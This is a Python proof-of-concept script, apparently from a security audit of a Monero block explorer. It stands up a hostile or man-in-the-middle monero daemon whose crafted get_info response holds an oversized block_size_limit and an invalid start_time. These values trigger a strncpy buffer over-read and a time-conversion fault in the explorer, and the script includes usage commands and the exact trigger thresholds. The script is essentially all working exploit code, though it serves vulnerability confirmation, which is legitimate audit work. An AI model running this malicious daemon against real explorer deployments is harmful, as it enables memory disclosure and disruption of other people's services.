#!/usr/bin/env python3
"""
Findings 26, 8 and 14 -- a hostile/MITM monero daemon.

Finding 26: src/rpccalls.cpp:24-27 hardcodes e_ssl_support_disabled, and README.md:312
recommends --daemon-url=node.sethforprivacy.com:18089 -- a third-party node over
plaintext HTTP. So daemon responses are attacker-controllable in the documented
deployment, by the node operator or anyone on the path.

This stands one up. It answers get_info with an oversized block_size_limit, which is
the input finding 8 needs, and an out-of-range start_time for finding 14.

  ./f26_f08_f14_hostile_daemon.py                       # listen on 18089
  ./xmrblocks --daemon-url=127.0.0.1:18089 ...          # point the explorer at it
  curl http://127.0.0.1:8081/                           # then read the front page

Finding 8 confirmation: block_size_limit/2/1024 must format to >= 10 chars, so
block_size_limit >= 2048000000. The explorer strncpy()s that into char[10] with
n == sizeof(dst), leaving no terminator, and string{buf} then over-reads into
block_size_median_str / start_time and renders the result.
"""
import http.server, json, sys

BLOCK_SIZE_LIMIT = 2_048_000_000     # -> "1000000.00" (10 chars, no NUL written)
BLOCK_SIZE_MEDIAN = 1_024_000_000    # -> "1000000.00" as well
BAD_START_TIME = 0x7FFFFFFFFFFFFFFF  # finding 14: unrepresentable for gmtime_r

def get_info():
    return {
        "status": "OK", "height": 3000000, "target_height": 0,
        "difficulty": 1, "difficulty_top64": 0, "target": 120,
        "tx_count": 1, "tx_pool_size": 0, "alt_blocks_count": 0,
        "outgoing_connections_count": 1, "incoming_connections_count": 1,
        "white_peerlist_size": 1, "grey_peerlist_size": 1,
        "testnet": False, "stagenet": False, "mainnet": True,
        "cumulative_difficulty": 1, "cumulative_difficulty_top64": 0,
        "block_size_limit": BLOCK_SIZE_LIMIT,
        "block_size_median": BLOCK_SIZE_MEDIAN,
        "block_weight_limit": BLOCK_SIZE_LIMIT,
        "start_time": BAD_START_TIME,
        "wide_difficulty": "0x1", "top_block_hash": "00"*32,
        "free_space": 1, "offline": False, "untrusted": False,
        "database_size": 1, "version": "0.18.4.0",
    }

class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def log_message(self, fmt, *a): sys.stderr.write("  [daemon] " + fmt % a + "\n")
    def _send(self, obj):
        body = json.dumps(obj).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers(); self.wfile.write(body)
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(n).decode(errors="replace")
        try: req = json.loads(raw)
        except Exception: req = {}
        method = req.get("method", self.path)
        sys.stderr.write(f"  [daemon] serving {method}\n")
        if method == "get_info":
            self._send({"jsonrpc":"2.0","id":"0","result":get_info()})
        elif method == "hard_fork_info":
            self._send({"jsonrpc":"2.0","id":"0",
                        "result":{"status":"OK","version":16,"enabled":True,
                                  "earliest_height":1,"threshold":0,"voting":16,
                                  "state":0,"window":10,"votes":10}})
        elif method == "get_fee_estimate":
            self._send({"jsonrpc":"2.0","id":"0",
                        "result":{"status":"OK","fee":20000,"quantization_mask":10000}})
        else:
            self._send({"jsonrpc":"2.0","id":"0","result":{"status":"OK"}})
    def do_GET(self):
        self._send({"status":"OK","height":3000000})

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 18089
    print(f"hostile daemon on 127.0.0.1:{port} (plaintext -- no TLS is even possible,")
    print(f"see finding 26). Serving block_size_limit={BLOCK_SIZE_LIMIT},")
    print(f"start_time=0x{BAD_START_TIME:x}\n")
    http.server.HTTPServer(("127.0.0.1", port), H).serve_forever()
